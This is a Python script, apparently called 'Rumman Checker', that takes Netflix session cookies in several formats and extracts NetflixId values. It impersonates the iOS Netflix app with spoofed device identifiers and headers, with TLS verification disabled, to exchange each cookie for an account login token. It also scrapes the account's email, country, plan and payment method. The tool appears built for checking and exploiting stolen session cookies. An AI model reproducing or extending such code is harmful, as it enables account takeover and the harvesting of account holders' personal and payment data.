#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Rumman Checker - Netflix Cookie Checker
Vercel-compatible version using Dora Bot's working logic
"""

import os
import sys
import re
import json
import time
import random
import hashlib
import base64
from datetime import datetime, timedelta, timezone
from typing import Tuple, Optional, Dict, List, Any

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEBUG = True

# ============================================
# CONSTANTS (from your bot)
# ============================================

NETFLIX_MEMBERSHIP_URL = "https://www.netflix.com/account/membership"
NETFLIX_YOUR_ACCOUNT = "https://www.netflix.com/YourAccount"

# ============================================
# UTILITIES (from your bot)
# ============================================

def decode_value(value):
    if value is None:
        return None
    value = str(value)
    value = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), value)
    value = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), value)
    value = value.replace('\\/', '/').replace('\\"', '"').replace('\\n', ' ').replace('\\t', ' ')
    value = re.sub(r'\s+', ' ', value).strip()
    return value if value else None

def clean_phone_number(phone: str) -> str:
    if not phone:
        return ""
    has_plus = phone.strip().startswith('+')
    digits = re.sub(r'\D', '', phone)
    if has_plus and digits:
        return f"+{digits}"
    return digits

# ============================================
# COOKIE PARSING (from your bot)
# ============================================

def extract_cookie_bundles(content: str) -> List[Tuple[Dict[str, str], str, Dict[str, Any]]]:
    bundles = []
    
    # Try JSON format
    try:
        data = json.loads(content)
        if isinstance(data, list):
            items = data
        elif isinstance(data, dict):
            items = data.get('cookies', [data])
        else:
            items = []
        
        cookie_sets = {}
        for item in items:
            if isinstance(item, dict):
                name = item.get('name')
                value = item.get('value')
                if name and value:
                    idx = item.get('index', 0)
                    if idx not in cookie_sets:
                        cookie_sets[idx] = {}
                    cookie_sets[idx][name] = value
        
        for idx, cookies in cookie_sets.items():
            if 'NetflixId' in cookies:
                netscape_lines = []
                for name, value in cookies.items():
                    domain = '.netflix.com'
                    secure = 'TRUE' if name == 'SecureNetflixId' else 'FALSE'
                    netscape_lines.append(f"{domain}\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
                netscape_content = "\n".join(netscape_lines)
                bundles.append((cookies, netscape_content, {}))
    except:
        pass
    
    # Try Netscape format
    if not bundles:
        blocks = re.split(r'\n\s*\n', content.strip())
        for block in blocks:
            if not block.strip():
                continue
            cookies = {}
            netscape_lines = []
            for line in block.splitlines():
                line = line.strip()
                if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')):
                    continue
                if line.startswith('#HttpOnly_'):
                    line = line[10:]
                parts = line.split('\t')
                if len(parts) >= 7:
                    domain = parts[0]
                    name = parts[5]
                    value = parts[6]
                    if 'netflix' in domain.lower():
                        cookies[name] = value
                        netscape_lines.append(line)
            if 'NetflixId' in cookies:
                bundles.append((cookies, "\n".join(netscape_lines), {}))
    
    # Try raw cookie values
    if not bundles:
        cookies = {}
        netscape_lines = []
        patterns = {
            'NetflixId': r'NetflixId[=:"]+([^";\s]+)',
            'SecureNetflixId': r'SecureNetflixId[=:"]+([^";\s]+)',
        }
        for name, pattern in patterns.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                cookies[name] = match.group(1)
                netscape_lines.append(f".netflix.com\tTRUE\t/\t{name == 'SecureNetflixId'}\t0\t{name}\t{match.group(1)}")
        if 'NetflixId' in cookies:
            bundles.append((cookies, "\n".join(netscape_lines), {}))
    
    return bundles

# ============================================
# ACCOUNT INFO EXTRACTION (from your bot)
# ============================================

def extract_account_info(response_text: str) -> Dict:
    info = {
        "countryOfSignup": None,
        "membershipStatus": None,
        "localizedPlanName": None,
        "maxStreams": None,
        "videoQuality": None,
        "holdStatus": None,
        "paymentMethod": None,
        "email": None,
        "accountOwnerName": None,
        "plan": None,
        "memberSince": None,
        "nextBillingDate": None,
        "planPrice": None,
    }
    
    # Extract email
    email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', response_text)
    if not email_match:
        email_match = re.search(r'"email"\s*:\s*"([^"]+)"', response_text)
    if email_match:
        info["email"] = decode_value(email_match.group(1))
    
    # Extract country
    country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', response_text)
    if not country_match:
        country_match = re.search(r'"countryOfSignup":\s*"([^"]+)"', response_text)
    if country_match:
        info["countryOfSignup"] = decode_value(country_match.group(1))
    
    # Extract plan
    plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', response_text)
    if plan_match:
        plan_name = decode_value(plan_match.group(1))
        info["localizedPlanName"] = plan_name
        if plan_name:
            plan_lower = plan_name.lower()
            if "premium" in plan_lower:
                info["plan"] = "Premium"
            elif "standard" in plan_lower:
                info["plan"] = "Standard"
            elif "basic" in plan_lower:
                info["plan"] = "Basic"
            else:
                info["plan"] = plan_name
    
    # Extract payment method
    payment_match = re.search(r'"paymentMethodType":\s*"([^"]+)"', response_text)
    if payment_match:
        info["paymentMethod"] = decode_value(payment_match.group(1))
    if not info.get("paymentMethod"):
        display_match = re.search(r'"displayText":\s*"([^"]+)"', response_text)
        if display_match:
            info["paymentMethod"] = decode_value(display_match.group(1))
    
    return info

# ============================================
# MAIN TOKEN GENERATION (COPY OF YOUR BOT'S LOGIC)
# ============================================

def create_nftoken(cookies: Dict[str, str]) -> Optional[Dict]:
    """Generate token using the EXACT same logic as your Discord bot"""
    netflix_id = cookies.get('NetflixId')
    if not netflix_id:
        print("❌ No NetflixId found in cookies")
        return None
    
    print(f"🔄 Requesting NFToken for NetflixId: {netflix_id[:30]}...")
    
    # This is the EXACT URL and params from your bot
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    
    params = {
        "appVersion": "15.48.1",
        "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        "device_type": "NFAPPL-02-",
        "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "idiom": "phone",
        "iosVersion": "15.8.5",
        "isTablet": "false",
        "languages": "en-US",
        "locale": "en-US",
        "maxDeviceWidth": "375",
        "model": "saget",
        "modelType": "IPHONE8-1",
        "odpAware": "true",
        "path": '["account","token","default"]',
        "pathFormat": "graph",
        "pixelDensity": "2.0",
        "progressive": "false",
        "responseFormat": "json",
    }
    
    # EXACT headers from your bot
    headers = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.context.ab-tests": "",
        "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        "x-netflix.client.type": "argo",
        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "x-netflix.context.locales": "en-US",
        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.client.iosversion": "15.8.5",
        "accept-language": "en-US;q=1",
        "x-netflix.argo.abtests": "",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        "Cookie": f"NetflixId={netflix_id}"
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=15, verify=False)
        print(f"📡 API Status: {response.status_code}")
        
        if response.status_code != 200:
            print(f"❌ API returned: {response.status_code}")
            return None
        
        data = response.json()
        
        token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
        token = token_data.get("token")
        expires = token_data.get("expires")
        
        if not token:
            print("⚠️ No token in response")
            return None
        
        print(f"✅ Token generated! Length: {len(token)}")
        
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        
        expires_str = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else None
        
        return {
            'token': token,
            'expires_at_utc': expires_str,
            'expires_timestamp': expires
        }
        
    except requests.exceptions.Timeout:
        print("❌ Request timed out")
        return None
    except Exception as e:
        print(f"❌ Error: {e}")
        return None

# ============================================
# VERCEL ENTRY POINT
# ============================================

def generate_token_from_cookie(cookie_content: str) -> Optional[Dict]:
    """Generate token from cookie content using your bot's logic"""
    bundles = extract_cookie_bundles(cookie_content)
    print(f"📦 Found {len(bundles)} cookie bundles")
    
    for cookies, netscape, info in bundles:
        if 'NetflixId' in cookies:
            print("🔑 Found NetflixId, attempting token generation...")
            token_data = create_nftoken(cookies)
            if token_data:
                return {
                    'token': token_data.get('token'),
                    'expires_at_utc': token_data.get('expires_at_utc'),
                    'cookies': cookies,
                    'info': info
                }
    
    return None
